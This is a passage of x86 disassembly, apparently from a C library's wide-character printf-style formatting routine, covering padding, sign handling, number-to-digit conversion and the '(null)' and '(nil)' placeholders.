lea eax, [var_fach]
mov dword [var_8h_2], 0xfa0
mov dword [var_4h_2], eax
mov eax, dword [var_1048h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_10ech], 0
xor edi, edi
test esi, esi
je 0x806ca89
mov eax, dword [var_10ech]
test eax, eax
jne 0x806ca5d
cmp dword [var_1100h], 0x53
je 0x806ca5d
mov ebx, dword [var_10f4h]
mov dword [var_1024h], esi
cmp ebx, 0xffffffff
je 0x806ca4e
lea esi, [ebx*4]
cmp esi, 0x1000
ja 0x806ca22
lea eax, [esi + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
lea eax, [var_1020h]
mov dword [var_8h_2], ebx
mov dword [var_1020h], 0
mov dword [var_sp_ch], eax
mov dword [var_101ch], 0
mov dword [esp], esi
lea eax, [var_1024h]
mov dword [var_4h_2], eax
call fcn.08077d80
cmp eax, 0xffffffff
mov ebx, eax
je 0x806c5e3
sub dword [var_10f0h], ebx
js 0x806c9f8
mov eax, dword [var_10d4h]
test eax, eax
jne 0x806c987
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c987
mov ecx, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov eax, dword [var_10d4h]
add dword [var_1030h], ebx
test eax, eax
je 0x806c9e3
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c9e3
mov ecx, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
test edi, edi
je 0x806bf3b
mov dword [esp], esi
call fcn.08051180
jmp 0x806bf3b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
add dword [var_1030h], ebx
jmp 0x806bf3b
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806c8f9
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x806c5e3
mov edi, 1
jmp 0x806c905
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
jmp 0x806c8e6
cmp dword [var_10f4h], 0xffffffff
je 0x806ca7f
mov eax, dword [var_10f4h]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.080783a0
mov ebx, eax
jmp 0x806c944
mov dword [esp], esi
call fcn.08077690
jmp 0x806ca78
cmp dword [var_10f4h], 0xffffffff
je 0x806ca9b
cmp dword [var_10f4h], 5
jle 0x806caaa
mov esi, str._null_
mov ebx, 6
jmp 0x806c944
mov esi, 0x8092948
xor ebx, ebx
jmp 0x806c944
mov edi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806cb4a
mov edx, dword [var_10e0h]
test edx, edx
jne 0x806cb30
mov eax, dword [var_10e8h]
test eax, eax
jne 0x806cb19
mov eax, dword [var_10e4h]
test eax, eax
je 0x806cb03
mov eax, dword [arg_10h]
mov edx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], dx
jmp 0x806bf3b
mov eax, dword [arg_10h]
mov ecx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x806bf3b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
movzx edx, byte [var_1030h]
mov byte [eax], dl
jmp 0x806bf3b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_1030h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x806bf3b
mov eax, dword [var_10e0h]
test eax, eax
jne 0x806cbca
mov eax, dword [var_10e8h]
test eax, eax
jne 0x806cbaf
mov eax, dword [var_10e4h]
test eax, eax
je 0x806cb8c
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov edi, dword [var_1030h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov word [eax], di
jmp 0x806bf3b
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov edi, dword [var_1030h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov dword [eax], edi
jmp 0x806bf3b
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806cb22
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [edi + eax*4]
jmp 0x806cb39
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d2c3
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x806d2a0
mov dword [var_10c8h], 0x10
mov dword [var_10c4h], eax
mov dword [var_10bch], 0
mov dword [var_10cch], 1
mov dword [var_10dch], 0
mov dword [var_1100h], 0x78
cmp dword [var_10f4h], 0
jl 0x806d291
mov byte [var_10f9h], 0x20
jne 0x806d165
mov eax, dword [var_10c4h]
test eax, eax
jne 0x806d165
cmp dword [var_10c8h], 8
mov esi, dword [var_103ch]
je 0x806d149
mov eax, dword [var_103ch]
sub eax, esi
sar eax, 2
cmp dword [var_10f4h], eax
jg 0x806ccc0
mov edi, dword [var_10c4h]
test edi, edi
je 0x806ccc0
mov ebx, dword [var_10cch]
test ebx, ebx
je 0x806ccc0
cmp dword [var_10c8h], 8
je 0x806d13b
lea esi, [esi]
mov edx, dword [var_103ch]
mov eax, 0
mov ecx, dword [var_10d4h]
sub edx, esi
sar edx, 2
sub dword [var_10f4h], edx
cmovns eax, dword [var_10f4h]
test ecx, ecx
mov dword [var_10f4h], eax
jne 0x806cf51
lea eax, [eax + edx]
mov edx, dword [var_10c4h]
sub dword [var_10f0h], eax
test edx, edx
je 0x806cd2b
mov eax, dword [var_10cch]
test eax, eax
je 0x806cd2b
mov eax, dword [var_10f0h]
sub eax, 2
cmp dword [var_10c8h], 0x10
cmovne eax, dword [var_10f0h]
mov dword [var_10f0h], eax
mov eax, dword [var_10bch]
test eax, eax
jne 0x806cd49
mov eax, dword [var_10d8h]
test eax, eax
jne 0x806cd49
mov eax, dword [var_10d0h]
test eax, eax
je 0x806cd4f
dec dword [var_10f0h]
cmp byte [var_10f9h], 0x20
je 0x806cf15
mov eax, dword [var_10bch]
test eax, eax
je 0x806ceae
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce92
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov ecx, dword [var_10c4h]
test ecx, ecx
je 0x806cdab
mov edx, dword [var_10cch]
test edx, edx
je 0x806cdab
cmp dword [var_10c8h], 0x10
je 0x806ce13
mov edi, dword [var_10f4h]
add dword [var_10f0h], edi
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806cde4
mov eax, dword [var_10f0h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x30
mov dword [var_8h_2], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
mov ecx, dword [arg_8h]
mov ebx, dword [var_103ch]
mov eax, dword [ecx + 0x94]
sub ebx, esi
mov dword [esp], ecx
sar ebx, 2
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
je 0x806bf35
jmp 0x806c5e3
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce73
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce5b
mov ecx, dword [var_1100h]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [ebp - 0x1030]
jmp 0x806cdab
mov eax, dword [var_1100h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ce4a
mov dword [var_4h_2], 0x30
mov dword [esp], ecx
call fcn.08075d10
inc eax
je 0x806c5e3
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
jmp 0x806ce2d
mov dword [var_4h_2], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806cd88
jmp 0x806c5e3
mov edi, dword [var_10d8h]
test edi, edi
je 0x806cede
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ced1
mov dword [eax], 0x2b
jmp 0x806cd82
mov dword [var_4h_2], 0x2b
mov dword [esp], edi
jmp 0x806ce9d
mov ebx, dword [var_10d0h]
test ebx, ebx
je 0x806cd8e
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806cf05
mov dword [eax], 0x20
jmp 0x806cd82
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [esp], edx
jmp 0x806ce9d
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806cf42
mov edi, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edi
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov dword [var_10f0h], 0
jmp 0x806cd5c
mov eax, dword [var_10bch]
test eax, eax
je 0x806d0d4
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d0b8
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
dec dword [var_10f0h]
mov eax, dword [var_10c4h]
test eax, eax
je 0x806cfaa
mov eax, dword [var_10cch]
test eax, eax
je 0x806cfaa
cmp dword [var_10c8h], 0x10
je 0x806d035
mov ebx, dword [var_103ch]
mov edi, dword [var_10f4h]
sub ebx, esi
sar ebx, 2
lea eax, [edi + ebx]
sub dword [var_10f0h], eax
test edi, edi
jle 0x806cfe5
mov eax, dword [arg_8h]
mov dword [var_8h_2], edi
mov dword [var_4h_2], 0x30
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov edi, dword [var_10f0h]
add dword [var_1030h], eax
test edi, edi
jle 0x806bf3b
mov ecx, dword [var_10f0h]
mov esi, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], esi
jmp 0x806c833
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d09c
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d084
mov ecx, dword [var_1100h]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [var_1030h]
sub dword [var_10f0h], 2
jmp 0x806cfaa
mov eax, dword [var_1100h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806d06c
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.08075d10
inc eax
je 0x806c5e3
mov edx, dword [edi + 0x58]
jmp 0x806d04f
mov dword [var_4h_2], 0x2d
mov dword [esp], edi
call fcn.08075d10
inc eax
jne 0x806cf7d
jmp 0x806c5e3
mov eax, dword [var_10d8h]
test eax, eax
je 0x806d107
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d0f7
mov dword [eax], 0x2b
jmp 0x806cf77
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x2b
mov dword [esp], edx
jmp 0x806d0c3
mov eax, dword [var_10d0h]
test eax, eax
je 0x806cf89
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d12e
mov dword [eax], 0x20
jmp 0x806cf77
mov dword [var_4h_2], 0x20
mov dword [esp], ecx
jmp 0x806d0c3
sub esi, 4
mov dword [esi], 0x30
jmp 0x806ccc0
mov eax, dword [var_10cch]
test eax, eax
je 0x806cc85
sub esi, 4
mov dword [esi], 0x30
jmp 0x806cc85
cmp dword [var_1100h], 0x58
mov esi, str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
mov ecx, dword [var_10c4h]
sete al
mov ebx, dword [var_103ch]
test al, 1
mov eax, str.0123456789abcdefghijklmnopqrstuvwxyz
cmove esi, eax
cmp dword [var_10c8h], 0xa
je 0x806d26b
ja 0x806d247
cmp dword [var_10c8h], 8
je 0x806d233
lea esi, [esi]
mov eax, ecx
xor edx, edx
sub ebx, 4
div dword [var_10c8h]
mov ecx, eax
mov eax, dword [esi + edx*4]
test ecx, ecx
mov dword [ebx], eax
jne 0x806d1b0
mov eax, dword [var_10dch]
mov esi, ebx
test eax, eax
je 0x806d1ff
mov eax, dword [var_102ch]
test eax, eax
je 0x806d1ff
mov edx, dword [var_1028h]
mov ecx, dword [var_102ch]
mov eax, ebx
mov dword [esp], edx
mov edx, dword [var_103ch]
call fcn.0806f240
sub esp, 4
mov esi, eax
mov eax, dword [var_10f8h]
test eax, eax
je 0x806cc85
cmp dword [var_10c8h], 0xa
jne 0x806cc85
mov ecx, dword [var_103ch]
mov dword [esp], esi
mov dword [var_4h_2], ecx
call fcn.0806b880
mov esi, eax
jmp 0x806cc85
mov eax, ecx
sub ebx, 4
and eax, 7
shr ecx, 3
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806d233
jmp 0x806d1c8
cmp dword [var_10c8h], 0x10
jne 0x806d1b0
mov eax, ecx
sub ebx, 4
and eax, 0xf
shr ecx, 4
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806d254
jmp 0x806d1c8
mov edi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul edi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [esi + ecx*4]
mov ecx, edx
mov dword [ebx], eax
jne 0x806d270
jmp 0x806d1c8
mov dword [var_10f4h], 1
jmp 0x806d165
cmp dword [var_10f4h], 4
mov eax, 5
mov esi, str._nil_
cmovg eax, dword [var_10f4h]
mov dword [var_10f4h], eax
jmp 0x806c8a2
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806cc0a
mov ecx, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d304
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x806c8ac
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
jmp 0x806c8ac
mov eax, dword [var_10ech]
test eax, eax
jne case.0x806c1dd.57
mov edi, dword [var_10d4h]
dec dword [var_10f0h]
test edi, edi
jne 0x806d36a
mov esi, dword [var_10f0h]
test esi, esi
jle 0x806d36a
mov edx, dword [var_10f0h]
mov ecx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov esi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [esi + esi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d39b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [esp], eax
call fcn.08077740
mov ecx, eax
jmp 0x806c865
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [esi + eax*4]
jmp 0x806d38c
mov edi, dword [var_1044h]
mov edx, dword [var_10a0h]
lea eax, [edi + edi*2]
shl eax, 4
add edx, eax
jne 0x806d523
lea ebx, [var_fech]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_10f4h]
mov esi, dword [var_1100h]
rep stosd dword es:[edi], eax
mov ecx, dword [var_10f0h]
movzx eax, byte [var_10e4h]
mov dword [var_fech], edx
mov dword [var_fe4h], esi
mov esi, dword [var_10e0h]
mov dword [var_fe8h], ecx
movzx ecx, byte [var_10e0h]
and eax, 1
add eax, eax
and ecx, 1
movzx edx, byte [var_fe0h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_10ech]
or edx, eax
movzx eax, byte [var_10cch]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_10d0h]
or edx, eax
movzx eax, byte [var_10d4h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_10dch]
or edx, eax
movzx eax, byte [var_10d8h]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movzx eax, byte [var_10f8h]
or edx, ecx
mov byte [var_fe0h], dl
movzx edx, byte [var_fdfh]
and eax, 1
shl eax, 3
or edx, 4
and edx, 0xfffffff7
or edx, eax
test esi, esi
movsx eax, byte [var_10f9h]
mov byte [var_fdfh], dl
mov dword [var_fdch], eax
je 0x806d512
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
lea eax, [var_fcch]
mov dword [var_4h_2], ebx
mov dword [var_1014h], eax
lea eax, [var_1014h]
mov dword [var_8h_2], eax
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.08067f60
jmp 0x806bf2d
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806d4e8
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + eax + 0x24]
mov dword [var_4h_2], edx
lea eax, [eax + eax*2]
lea eax, [esi + eax*4]
jmp 0x806d4f2
mov dword [var_10c8h], 0x10
mov esi, dword [var_10e0h]
mov dword [var_10bch], 0
mov dword [var_10d8h], 0
mov dword [var_10d0h], 0
test esi, esi
je 0x806d6ed
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d6c2
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_10c4h], edx
mov dword [var_10c0h], ecx
cmp dword [var_10f4h], 0
jl 0x806d6b3
mov byte [var_10f9h], 0x20
jne 0x806d60e
mov eax, dword [var_10c0h]
or eax, dword [var_10c4h]
jne 0x806d60e
cmp dword [var_10c8h], 8
mov esi, dword [var_103ch]
je 0x806d5f9
mov edx, dword [var_10c4h]
or edx, dword [var_10c0h]
setne al
movzx eax, al
mov dword [var_10c4h], eax
jmp 0x806cc85
mov ebx, dword [var_10cch]
test ebx, ebx
je 0x806d5dc
sub esi, 4
mov dword [esi], 0x30
jmp 0x806d5dc
xor eax, eax
mov ecx, dword [var_103ch]
mov esi, dword [var_10c4h]
cmp dword [var_1100h], 0x58
mov edx, dword [var_10c8h]
sete al
mov edi, dword [var_10c0h]
mov dword [var_8h_2], ecx
mov dword [esp], esi
mov dword [var_sp_ch], edx
mov dword [var_4h_2], edi
mov dword [var_10h], eax
call fcn.0808d930
mov ecx, dword [var_10dch]
mov esi, eax
test ecx, ecx
je 0x806d67f
mov edx, dword [var_102ch]
test edx, edx
je 0x806d67f
mov edi, dword [var_1028h]
mov ecx, dword [var_102ch]
mov edx, dword [var_103ch]
mov dword [esp], edi
call fcn.0806f240
sub esp, 4
mov esi, eax
mov edi, dword [var_10f8h]
test edi, edi
je 0x806d5dc
cmp dword [var_10c8h], 0xa
jne 0x806d5dc
mov eax, dword [var_103ch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.0806b880
mov esi, eax
jmp 0x806d5dc
mov dword [var_10f4h], 1
jmp 0x806d60e
mov ecx, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
mov edi, dword [edi + eax*4 + 4]
mov dword [var_10c4h], esi
mov dword [var_10c0h], edi
jmp 0x806d5a9
mov ecx, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d745
mov esi, dword [var_10e8h]
test esi, esi
je 0x806d724
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_10c4h], eax
jmp 0x806cc4a
mov ebx, dword [var_10e4h]
test ebx, ebx
jne 0x806d739
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x806d719
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x806d719
mov ecx, dword [var_10e8h]
test ecx, ecx
je 0x806d768
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [edi + eax*4]
jmp 0x806d719
mov eax, dword [var_10e4h]
test eax, eax
jne 0x806d78a
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806d719
mov edi, dword [var_10a0h]
mov eax, dword [edi + edx + 0x24]
mov edx, dword [var_10a8h]
lea eax, [eax + eax*2]
movzx eax, word [edx + eax*4]
jmp 0x806d719
mov dword [var_10c8h], 8
jmp 0x806d549
mov dword [var_10c8h], 0xa
jmp 0x806d549
mov edi, dword [var_10e0h]
mov dword [var_10c8h], 0xa
test edi, edi
je 0x806d83d
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d821
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov edi, edx
shr edi, 0x1f
mov dword [var_10bch], edi
je 0x806d810
neg eax
adc edx, 0
neg edx
mov dword [var_10c4h], eax
mov dword [var_10c0h], edx
jmp 0x806d5a9
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4 + 4]
mov eax, dword [esi + eax*4]
jmp 0x806d7fc
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d87b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [eax]
mov eax, edx
mov edi, edx
neg eax
shr edi, 0x1f
cmovne edx, eax
mov dword [var_10bch], edi
mov dword [var_10c4h], edx
jmp 0x806cc4a
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4]
jmp 0x806d85e
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d8b8
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
jmp 0x806bf3b
mov dword [var_4h_2], 0x25
mov dword [esp], edi
call fcn.08075d10
inc eax
jne 0x806d8ad
jmp 0x806c5e3
lea ebx, [var_fech]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_1094h]
rep stosd dword es:[edi], eax
mov eax, dword [var_1084h]
movzx ecx, byte [var_107ch]
mov dword [var_fe4h], edx
mov edi, dword [var_1088h]
movzx edx, byte [var_1078h]
mov dword [var_fe8h], eax
shl ecx, 2
mov dword [var_fech], edi
add edx, edx
movzx eax, byte [var_fe0h]
or byte [var_fdfh], 4
and eax, 0xfffffffc
or eax, dword [var_1074h]
or eax, edx
movzx edx, byte [var_1060h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_1064h]
shl edx, 3
or eax, edx
movzx edx, byte [var_1068h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_106ch]
shl edx, 5
or eax, edx
movzx edx, byte [var_1070h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
mov ecx, dword [var_1090h]
shl edx, 7
or eax, edx
mov dword [var_fdch], ecx
mov byte [var_fe0h], al
mov eax, dword [var_1074h]
test eax, eax
je 0x806da82
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
mov esi, dword [arg_8h]
lea eax, [var_fcch]
mov dword [var_4h], ebx
mov dword [var_1000h], eax
lea eax, [var_1000h]
mov dword [var_8h], eax
mov dword [esp], esi
call fcn.0806a140
test eax, eax
js 0x806c5e3
add dword [var_1030h], eax
mov eax, dword [var_1038h]
inc dword [var_1044h]
test eax, eax
jne 0x806da6f
mov ebx, dword [var_ff4h]
add ebx, 4
mov dword [var_ff4h], ebx
mov dword [esp], ebx
call fcn.08074b00
mov esi, dword [arg_8h]
mov edx, eax
mov dword [var_ff4h], eax
sub edx, ebx
sar edx, 2
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
call dword [eax + 0x1c]
mov ecx, dword [var_ff4h]
mov edx, eax
mov eax, ecx
sub eax, ebx
sar eax, 2
cmp edx, eax
jne 0x806da60
mov eax, dword [ecx]
add dword [var_1030h], edx
test eax, eax
jne 0x806bb53
jmp 0x806bb01
mov dword [var_1030h], 0xffffffff
jmp 0x806bb01
mov ecx, dword [var_1038h]
mov dword [esp], ecx
call fcn.08051180
jmp 0x806d9fd
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806d9ba
mov eax, dword [var_1068h]
dec dword [var_1084h]
test eax, eax
jne 0x806dad3
mov eax, dword [var_1084h]
test eax, eax
jle 0x806dad3
mov edx, dword [var_1084h]
mov ecx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806db3d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
mov eax, dword [var_1068h]
inc dword [var_1030h]
test eax, eax
je 0x806d9ed
mov eax, dword [var_1084h]
test eax, eax
jle 0x806d9ed
mov edi, dword [var_1084h]
mov eax, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov dword [esp], eax
call fcn.08075900
jmp 0x806d9e7
mov dword [var_4h], ecx
mov dword [esp], esi
call fcn.08075d10
inc eax
jmp 0x806daf3
lea eax, [var_fach]
mov dword [var_8h], 0xfa0
mov dword [var_4h], eax
mov eax, dword [var_1048h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_107ch], 0
xor edi, edi
test esi, esi
je 0x806dd55
mov eax, dword [var_107ch]
test eax, eax
jne 0x806dd29
cmp dword [var_1094h], 0x53
je 0x806dd29
mov ebx, dword [var_1088h]
mov dword [var_100ch], esi
cmp ebx, 0xffffffff
je 0x806dd1a
lea esi, [ebx*4]
cmp esi, 0x1000
ja 0x806dcee
lea eax, [esi + 0x10]
sub esp, eax
lea esi, [var_10f9h]
and esi, 0xfffffff0
lea eax, [var_1008h]
mov dword [var_8h], ebx
mov dword [var_1008h], 0
mov dword [esp + 0xc], eax
mov dword [var_1004h], 0
mov dword [esp], esi
lea eax, [var_100ch]
mov dword [var_4h], eax
call fcn.08077d80
cmp eax, 0xffffffff
mov ebx, eax
je 0x806c5e3
sub dword [var_1084h], ebx
js 0x806dcc4
mov eax, dword [var_1068h]
test eax, eax
jne 0x806dc53
mov ecx, dword [var_1084h]
test ecx, ecx
